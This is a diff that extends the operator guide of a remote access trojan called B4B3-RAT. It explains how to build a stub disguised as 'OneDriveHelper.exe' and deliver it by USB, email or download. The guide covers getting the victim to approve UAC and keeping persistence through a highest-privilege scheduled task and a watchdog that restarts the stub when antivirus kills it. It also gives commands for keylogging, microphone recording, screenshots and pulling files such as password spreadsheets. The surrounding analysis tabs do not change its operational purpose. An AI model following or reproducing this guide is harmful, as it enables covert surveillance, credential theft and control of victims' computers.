@@ -1449,7 +1449,64 @@ function renderDocs() {
 <!-- ═══════════════════════════════════════════════════════ OVERVIEW ══ -->
 <div class="docs-section">
   <div class="docs-h1">B4B3-RAT Dashboard — Operator Guide</div>
-  <p class="docs-p">This guide covers every feature of the dashboard, every bot command, and how the 📁 Files tab works. Bookmark this tab — you can always open it from the top nav.</p>
+  <p class="docs-p">Complete reference for deploying the stub, managing bots, using every dashboard tab, and running every command.</p>
+</div>
+
+<!-- ══════════════════════════════════════ DEPLOYMENT & FIRST RUN ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Deploying the Stub — Step by Step</div>
+  <p class="docs-p">You only need to get the target to run <code>OneDriveHelper.exe</code> <b>once</b> with admin. Everything else is automatic after that.</p>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:40px">#</th><th>What happens</th></tr></thead>
+      <tbody>
+        <tr><td>1</td><td><b>Build:</b> run <code>build.ps1</code> → open Builder → fill in C2 host/port/auth/delay/drop path → click Build → download <code>OneDriveHelper.exe</code>.</td></tr>
+        <tr><td>2</td><td><b>Get it onto the target</b> — USB, email, shared folder, web download, whatever method you have.</td></tr>
+        <tr><td>3</td><td><b>Run it once</b> — either the target user double-clicks it, or you run it yourself if you already have admin access to the machine (RDP, remote shell, etc.).</td></tr>
+        <tr><td>4</td><td><b>UAC dialog appears</b> — "Do you want to allow this app to make changes?" → click <b>Yes</b>. This is the only time admin is needed from the user's side.</td></tr>
+        <tr><td>5</td><td><b>First-run setup happens automatically (1–2 seconds):</b>
+          <ul style="margin:6px 0 0 16px;line-height:2">
+            <li>Copies itself to the drop path (e.g. <code>C:\Users\Public\OneDriveHelper.exe</code>)</li>
+            <li>Creates a Windows Scheduled Task set to run at every logon with <b>highest privileges (admin, no UAC)</b></li>
+            <li>Connects to your C2 — bot appears in the dashboard sidebar</li>
+          </ul>
+        </td></tr>
+        <tr><td>6</td><td><b>Done.</b> You have full control. Send any command from the Summary tab.</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="docs-note">If you already have an admin shell on the target (RDP, existing RAT, etc.) you can run it directly:<br>
+  <code>C:\path\to\OneDriveHelper.exe</code><br>
+  No double-click needed. The self-elevation code detects it's already elevated and skips UAC entirely.</div>
+</div>
+
+<!-- ══════════════════════════════════════════ AFTER REBOOT ══ -->
+<div class="docs-section">
+  <div class="docs-h2">What Happens After the PC Reboots / Shuts Down?</div>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:160px">Situation</th><th>Result</th></tr></thead>
+      <tbody>
+        <tr>
+          <td>PC reboots / shuts down and comes back on</td>
+          <td>✅ Bot comes back <b>automatically</b>. The scheduled task fires at the next Windows logon — full admin, no UAC, no user action needed. The bot re-appears in the dashboard sidebar within seconds of the user logging in.</td>
+        </tr>
+        <tr>
+          <td>Stub process killed by user / antivirus</td>
+          <td>✅ The Protector watchdog (a separate process) detects it and restarts the stub within ~5 seconds.</td>
+        </tr>
+        <tr>
+          <td>Scheduled task deleted by user</td>
+          <td>❌ Bot will not auto-start on next boot. You would need to get the target to run the stub again, or use the <code>service add</code> command to create a Windows service as an alternative persistence method.</td>
+        </tr>
+        <tr>
+          <td>Stub file deleted</td>
+          <td>❌ Task points to a deleted file — nothing runs. Send <code>run</code> or <code>loader</code> commands to re-deploy while you still have a session.</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="docs-warn">⚠ The scheduler task uses <code>/RL HIGHEST</code> — this means it runs with full admin on every logon <b>with no UAC prompt</b>. Once set up, the target user sees nothing unusual at boot.</div>
 </div>
 
 <!-- ═══════════════════════════════════════════════════ DASHBOARD NAV ══ -->
@@ -1459,12 +1516,24 @@ function renderDocs() {
     <table class="docs-table">
       <thead><tr><th style="width:130px">Page</th><th>What it does</th></tr></thead>
       <tbody>
-        <tr><td>Overview</td><td>Live summary of all connected bots — total count, online vs stale, recent events across all bots. Auto-refreshes every 5 s.</td></tr>
-        <tr><td>Bot Detail</td><td>Appears when you click a bot in the sidebar. Contains all the per-bot tabs described below. The sidebar shows all bots sorted by most-recent check-in. Green dot = checked in within 60 s.</td></tr>
-        <tr><td>⚙ Builder</td><td>Configure and download a pre-patched <code>OneDriveHelper.exe</code> stub. Fill in C2 Host, Port, Auth Key, poll delay, and drop path, then click Build.</td></tr>
+        <tr><td>Overview</td><td>Live summary of all bots — total count, online/offline, recent events. Auto-refreshes every 5 s. Bots persist across server restarts (saved to disk).</td></tr>
+        <tr><td>Bot Detail</td><td>Click any bot in the sidebar. Sidebar shows <b>● ONLINE</b> (last seen &lt;60s), <b>○ OFFLINE</b>, or <b>⛔ BLOCKED</b> status. Hover a bot to reveal Block and Delete buttons.</td></tr>
+        <tr><td>⚙ Builder</td><td>Configure and download <code>OneDriveHelper.exe</code>. Fill in C2 Host, Port, Auth Key, delay, drop path — click Build.</td></tr>
         <tr><td>📖 Docs</td><td>This page.</td></tr>
       </tbody>
     </table>
+  </div>
+  <div style="margin-top:12px">
+  <div class="docs-h2" style="margin-bottom:8px">Sidebar Bot Actions (hover any bot card)</div>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:130px">Action</th><th>What it does</th></tr></thead>
+      <tbody>
+        <tr><td>🚫 Block</td><td>Silently ignores all requests from that bot — no data stored, no commands delivered. The stub keeps running on target with no idea it's blocked. Click <b>✔ Unblock</b> to resume.</td></tr>
+        <tr><td>🗑 Delete</td><td>Removes the bot from the dashboard. Data saved to disk first. If the same bot checks in again it re-appears fresh.</td></tr>
+      </tbody>
+    </table>
+  </div>
   </div>
 </div>
 
@@ -1475,7 +1544,7 @@ function renderDocs() {
     <table class="docs-table">
       <thead><tr><th style="width:130px">Tab</th><th>What it shows / lets you do</th></tr></thead>
       <tbody>
-        <tr><td>Summary</td><td>System info (hostname, user, OS, IP), command input box, all command results, and a grid of every file the bot has uploaded (screenshots, recordings, pulled files). This is the main control tab.</td></tr>
+        <tr><td>Summary</td><td>System info (hostname, user, OS, IP), command input box, all command results, and every uploaded file (screenshots, recordings, pulled files). <b>This is the main control tab.</b></td></tr>
         <tr><td>Risk Score</td><td>Automated score (0–200+) built from telemetry rules. Breaks down which activities contributed points. CRITICAL ≥100, HIGH ≥65, MEDIUM ≥35, LOW below.</td></tr>
         <tr><td>Timeline</td><td>Every event sorted by time. Filter by severity (critical / high / medium / low / info). Use this to replay exactly what happened and when.</td></tr>
         <tr><td>Network</td><td>All network connections and HTTP traffic the bot has logged. Shows src→dst flows with ports and timestamps.</td></tr>
@@ -1487,7 +1556,7 @@ function renderDocs() {
         <tr><td>Report</td><td>Export a full plaintext or JSON report of all bot activity. Use for logging or external analysis.</td></tr>
         <tr><td>Lab Console</td><td>Pre-built action playbooks (screenshot burst, keylog capture, process dump, etc.). Click an action to queue it; approve and execute from the same tab.</td></tr>
         <tr><td>Coverage</td><td>Shows which command categories have been used vs which have never been run — useful for planning what to test next.</td></tr>
-        <tr><td>📁 Files</td><td>Terminal-style file browser. Navigate folders, read files, and pull (download) any file from the target. See the Files Tab section below for all commands.</td></tr>
+        <tr><td>📁 Files</td><td>Terminal file browser. Type <code>ls</code>, <code>cd folder</code>, <code>pull file.mp4</code>, <code>cat file.txt</code>. Click any 📁 folder to navigate in. Every file has a <b>↓ Pull</b> button to download it directly to this dashboard.</td></tr>
       </tbody>
     </table>
   </div>
@@ -1496,8 +1565,8 @@ function renderDocs() {
 <!-- ══════════════════════════════════════════════════ SENDING COMMANDS ══ -->
 <div class="docs-section">
   <div class="docs-h2">How to Send a Command</div>
-  <p class="docs-p">Go to <b>Bot Detail → Summary tab</b>. Type the command in the input box at the top of the page and press <b>Enter</b> or click <b>Send</b>. Results appear in the Results box below within a few seconds (depends on the stub's poll interval — default 3 s). The bot polls the C2 for commands, executes, then sends the result back. You can send the next command before the result arrives.</p>
-  <div class="docs-note">Tip: The auto-refresh checkbox keeps the results box live. Leave it on.</div>
+  <p class="docs-p">Open <b>Bot Detail → Summary tab</b>. Type the command in the input box and press <b>Enter</b> or click <b>Send</b>. The bot polls your C2 every few seconds (set by Delay in the Builder), executes the command, and sends back the result. Results appear in the box below. You can queue the next command without waiting.</p>
+  <div class="docs-note">Keep Auto-refresh enabled (top-right checkbox) so results stream in automatically.</div>
 </div>
 
 <!-- ═════════════════════════════════════════════════════ COMMANDS ══ -->
@@ -1693,32 +1762,40 @@ function renderDocs() {
 <div class="docs-section">
   <div class="docs-h2">Quick Workflows</div>
 
-  <div class="docs-h2" style="font-size:12px;color:var(--light);text-transform:none;letter-spacing:0">Get basic recon</div>
+  <div class="docs-h2" style="font-size:12px;color:var(--light);text-transform:none;letter-spacing:0">Initial recon — first thing to run after a bot connects</div>
   <div class="docs-note">system whoami
 system hostname
 system ipconfig /all
 system net user</div>
 
-  <div class="docs-h2" style="font-size:12px;color:var(--light);text-transform:none;letter-spacing:0;margin-top:12px">Browse and download a file</div>
+  <div class="docs-h2" style="font-size:12px;color:var(--light);text-transform:none;letter-spacing:0;margin-top:12px">Browse the target's files and download one</div>
   <div class="docs-note">1. Click the 📁 Files tab
-2. Type: ls
-3. Click any 📁 folder to navigate
-4. Click ↓ Pull next to any file to download it</div>
+2. Type: ls        ← lists C:\
+3. Click any 📁 folder to navigate into it
+4. Click ↓ Pull next to any file → download link appears</div>
 
-  <div class="docs-h2" style="font-size:12px;color:var(--light);text-transform:none;letter-spacing:0;margin-top:12px">Take a screenshot every 10 seconds (manual burst)</div>
+  <div class="docs-h2" style="font-size:12px;color:var(--light);text-transform:none;letter-spacing:0;margin-top:12px">Pull a file directly by path (from Summary tab)</div>
+  <div class="docs-note">pull C:\Users\Username\Desktop\file.pdf
+pull C:\Users\Username\Pictures\photo.jpg
+pull C:\Users\Username\Documents\passwords.xlsx</div>
+
+  <div class="docs-h2" style="font-size:12px;color:var(--light);text-transform:none;letter-spacing:0;margin-top:12px">Take a screenshot</div>
   <div class="docs-note">screenshot
-(wait 10s)
-screenshot
-(repeat — or use Lab Console → Screenshot Burst)</div>
+(result appears in Summary → Uploaded Files as a download link)</div>
 
-  <div class="docs-h2" style="font-size:12px;color:var(--light);text-transform:none;letter-spacing:0;margin-top:12px">Capture keystrokes for 5 minutes then retrieve</div>
+  <div class="docs-h2" style="font-size:12px;color:var(--light);text-transform:none;letter-spacing:0;margin-top:12px">Record microphone for 15 seconds</div>
+  <div class="docs-note">mic record 15</div>
+
+  <div class="docs-h2" style="font-size:12px;color:var(--light);text-transform:none;letter-spacing:0;margin-top:12px">Capture keystrokes then retrieve them</div>
   <div class="docs-note">keylog start
-(wait)
+(wait as long as you want)
 keylog dump
 keylog stop</div>
 
-  <div class="docs-h2" style="font-size:12px;color:var(--light);text-transform:none;letter-spacing:0;margin-top:12px">Pull a specific file</div>
-  <div class="docs-note">pull C:\\Users\\Username\\Desktop\\passwords.txt</div>
+  <div class="docs-h2" style="font-size:12px;color:var(--light);text-transform:none;letter-spacing:0;margin-top:12px">Run any Windows command and get the output</div>
+  <div class="docs-note">system tasklist
+system netstat -ano
+system dir C:\Users\Username\Desktop</div>
 </div>
 
 <!-- ══════════════════════════════════════════════════ SERVER NOTES ══ -->
@@ -1728,11 +1805,13 @@ keylog stop</div>
     <table class="docs-table">
       <thead><tr><th style="width:200px">Topic</th><th>Notes</th></tr></thead>
       <tbody>
-        <tr><td>VPS address</td><td>C2 runs at port 4444 (plain HTTP). Do NOT add cert.pem/key.pem — the stub uses HTTP only, not HTTPS.</td></tr>
-        <tr><td>Update server</td><td><code>git pull &amp;&amp; pm2 restart c2-server</code> on the VPS. If package.json changed, run <code>npm install</code> first.</td></tr>
-        <tr><td>Rebuild stub</td><td><code>cd B4B3-RAT\Stub &amp;&amp; powershell -ExecutionPolicy Bypass -File build.ps1</code> — then open Builder and re-configure to get a new OneDriveHelper.exe.</td></tr>
-        <tr><td>Duplicate bots</td><td>Fixed — bot ID is stored in registry. If you still see duplicates, the old binary (before the fix) is still running. Kill it with Task Manager → End Process Tree.</td></tr>
-        <tr><td>Uploaded files</td><td>Stored in <code>c2-server/uploads/</code> on the VPS. Download via Summary → Uploaded Files links (admin-authenticated).</td></tr>
+        <tr><td>Bot persistence</td><td>All bot data is saved to <code>c2-server/data/bots.json</code> automatically every few seconds. Bots survive server restarts — they re-appear in the sidebar after restarting and will re-connect on their next check-in.</td></tr>
+        <tr><td>Auto-reboot (target)</td><td>The scheduled task (<code>/RL HIGHEST</code>) fires at every Windows logon — bot comes back with full admin, no UAC. No user action needed after first run.</td></tr>
+        <tr><td>VPS server</td><td>C2 runs at port 4444 — plain HTTP only. Do NOT add <code>cert.pem</code>/<code>key.pem</code> — the stub uses HTTP, not HTTPS.</td></tr>
+        <tr><td>Update server</td><td><code>git pull &amp;&amp; pm2 restart c2-server</code> — bots will re-appear from disk after restart.</td></tr>
+        <tr><td>Rebuild stub</td><td><code>cd B4B3-RAT\Stub</code> → <code>powershell -ExecutionPolicy Bypass -File build.ps1</code> → open Builder → re-configure → new <code>OneDriveHelper.exe</code>.</td></tr>
+        <tr><td>Duplicate bots</td><td>Fixed — Bot ID stored in registry on first run. If you still see duplicates, an old binary is running. Kill it: Task Manager → End Process Tree.</td></tr>
+        <tr><td>Uploaded files</td><td>Stored in <code>c2-server/uploads/</code> on VPS. Download via Summary → Uploaded Files links. Require login.</td></tr>
       </tbody>
     </table>
   </div>
